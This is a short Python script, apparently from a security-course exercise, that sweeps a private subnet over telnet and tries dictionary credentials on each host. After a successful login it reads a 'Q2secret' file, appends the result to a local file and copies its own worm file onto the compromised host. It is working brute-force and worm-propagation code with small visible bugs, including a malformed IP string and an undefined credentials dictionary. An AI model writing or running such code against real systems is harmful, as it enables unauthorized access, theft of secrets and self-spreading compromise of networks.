import telnetlib
import sys

for i in range(0,256):
	ip_address = '172.16.48' + str(i)
	print(ip_address)
	for username, password in username_passwords.items():
		try:
			tn = telnetlib.Telnet(ip_address, timeout=3)
			tn.read_until(b"login: ")
			tn.write(username.encode('ascii') + b"\n")            
			tn.read_until(b"Password: ")
			tn.write(password.encode('ascii') + b"\n")
			login_output = tn.read_until(b"$", 5).decode('ascii')
			if "$" in login_output:
				print(f"Successfully logged in with username '{username}' and password '{password}'")
				tn.write(b"ls\n")
				tn.write(b"cat Q2secret\n")
				output = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
				output1 = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
				output1 = output1.strip() + '\n'
				with open('Q2wormtn.py', 'rb') as f:
					tn.write(b'cat > tmp.py\n')
					tn.write(f.read())  
					tn.write(b'\n')
				tn.write(b"exit\n")	
				secrets = open("Q2secrets", 'a')
				secrets.write(output1.strip('$'))
				secrets.close()
				break
			else:
				print(f"Failed to login with username '{username}' and pass '{password}'")
			tn.close()
		except:
			print('username', end=' ')
			print(username, end=' ')
			print('failed')